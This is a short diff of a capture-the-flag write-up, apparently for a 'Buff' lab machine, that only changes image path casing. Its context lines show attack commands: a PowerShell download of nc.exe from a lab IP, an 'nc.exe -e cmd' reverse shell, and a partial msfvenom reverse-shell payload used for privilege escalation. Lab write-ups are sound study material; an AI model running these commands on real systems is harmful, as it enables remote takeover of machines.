@@ -60,7 +60,7 @@ powershell -c "iwr -Uri http://10.10.x.x/nc.exe -O nc.exe"
 nc.exe -e cmd 10.10.x.x 9001
 ```
 
-![buff-user](./Images/buff-user.png)
+![buff-user](./images/buff-user.png)
 ## Priv-Esc
 
 * by executing linpeas we can observe the Cloudme_1112.exe and it's respective service running on the machine
@@ -78,4 +78,5 @@ msfvenom -a x86 -p windows/shell_reverse_tcp LPORT=443 LHOST=10.10.x.x --smalles
 ```
 
 * Executing the payload now gives us an Admin shell
-![buff-admin](./Images/buff-admin.png)
+
+![buff-admin](./images/buff-admin.png)
